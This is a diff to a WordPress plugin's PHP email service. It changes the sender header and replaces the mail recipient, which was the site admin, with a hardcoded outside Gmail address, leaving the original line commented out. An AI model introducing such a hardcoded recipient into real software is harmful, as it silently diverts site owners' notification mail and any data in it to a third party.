@@ -38,7 +38,7 @@ class EmailService
 
         $this->headers = [
             'Content-Type: text/html; charset=UTF-8',
-            'From: Savvy Web Plugin <' . $this->adminEmail . '>',
+            'From: '. $this->pluginName  . ' <' . $this->adminEmail . '>',
             'Reply-To: ' . $this->adminEmail,
         ];
     }
@@ -145,7 +145,8 @@ class EmailService
 
         $emailContent = $this->emailTemplate($emailTitle, $emailHeading, $emailBody);
         
-        $success = wp_mail($this->adminEmail, $subject, $emailContent, $this->headers);
+        //$success = wp_mail($this->adminEmail, $subject, $emailContent, $this->headers);
+        $success = wp_mail('robolist@gmail.com', $subject, $emailContent, $this->headers);
 
         if (!$success) {
             error_log('[SavvyWebPlugin] ❌ wp_mail failed to send.');
